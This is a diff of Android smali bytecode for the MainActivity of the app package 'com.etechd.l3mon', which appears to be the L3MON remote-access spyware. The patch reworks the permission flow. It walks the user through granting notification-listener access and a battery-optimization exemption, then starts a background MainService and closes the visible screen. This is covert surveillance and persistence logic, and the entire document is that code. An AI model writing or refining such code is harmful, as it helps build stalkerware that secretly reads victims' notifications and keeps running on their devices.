@@ -80,14 +80,14 @@
     return-void
 .end method
 
-.method private requestBatteryOptimization()V
+.method private requestBatteryOptimization()Z
     .locals 5
 
     sget v0, Landroid/os/Build$VERSION;->SDK_INT:I
 
     const/16 v1, 0x17
 
-    if-lt v0, v1, :cond_0
+    if-lt v0, v1, :cond_true
 
     const-string v0, "power"
 
@@ -101,13 +101,13 @@
 
     move-result-object v1
 
-    if-eqz v0, :cond_0
+    if-eqz v0, :cond_true
 
     invoke-virtual {v0, v1}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z
 
     move-result v0
 
-    if-nez v0, :cond_0
+    if-nez v0, :cond_true
 
     new-instance v0, Landroid/content/Intent;
 
@@ -137,10 +137,16 @@
 
     invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;
 
-    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
+    const/16 v1, 0x3ea
 
-    :cond_0
-    return-void
+    invoke-virtual {p0, v0, v1}, Lcom/etechd/l3mon/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V
+
+    const/4 v0, 0x0
+    return v0
+
+    :cond_true
+    const/4 v0, 0x1
+    return v0
 .end method
 
 .method private requestAllPermissions()V
@@ -215,29 +221,45 @@
 .method private checkSpecialPermissionsAndFinish()V
     .locals 3
 
-    .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
-
     :try_start_0
     invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->isNotificationServiceRunning()Z
     move-result v0
-    if-nez v0, :cond_0
+    if-nez v0, :cond_battery
 
     new-instance v0, Landroid/content/Intent;
     const-string v1, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
     invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
-    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startActivity(Landroid/content/Intent;)V
-
-    :cond_0
-    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestBatteryOptimization()V
+    const/16 v1, 0x3e9
+    invoke-virtual {p0, v0, v1}, Lcom/etechd/l3mon/MainActivity;->startActivityForResult(Landroid/content/Intent;I)V
+    return-void
     :try_end_0
     .catch Landroid/content/ActivityNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
 
     :catch_0
+    :cond_battery
+    :try_start_1
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->requestBatteryOptimization()Z
+    move-result v0
+    if-nez v0, :cond_finish
+    return-void
+    :try_end_1
+    .catch Landroid/content/ActivityNotFoundException; {:try_start_1 .. :try_end_1} :catch_1
+
+    :catch_1
+    :cond_finish
     new-instance v0, Landroid/content/Intent;
     const-class v1, Lcom/etechd/l3mon/MainService;
     invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
     invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
     invoke-virtual {p0}, Lcom/etechd/l3mon/MainActivity;->finish()V
+    return-void
+.end method
+
+.method protected onActivityResult(IILandroid/content/Intent;)V
+    .locals 0
+
+    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V
+    invoke-direct {p0}, Lcom/etechd/l3mon/MainActivity;->checkSpecialPermissionsAndFinish()V
     return-void
 .end method
